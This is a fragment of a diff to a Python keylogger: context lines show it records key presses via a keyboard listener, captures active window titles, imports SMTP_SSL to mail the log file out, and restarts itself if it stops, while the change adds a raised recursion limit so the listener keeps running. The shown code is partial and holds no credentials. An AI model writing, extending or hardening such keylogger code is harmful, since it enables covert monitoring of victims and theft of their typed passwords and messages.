@@ -4,6 +4,7 @@ from datetime import date, datetime
 from linecache import getline
 from smtplib import SMTP_SSL
 from pyautogui import getActiveWindowTitle
+from sys import setrecursionlimit
 
 # Check if it's time to send the log file
 day = getline("check_file", 1)
@@ -140,6 +141,8 @@ def press(key):
         file.close()
 
 # Start the listener, if it stops working while listening, will be restarted
+setrecursionlimit(10000)
+
 def start():
     try:
         with keyboard.Listener(on_press=press) as listener:
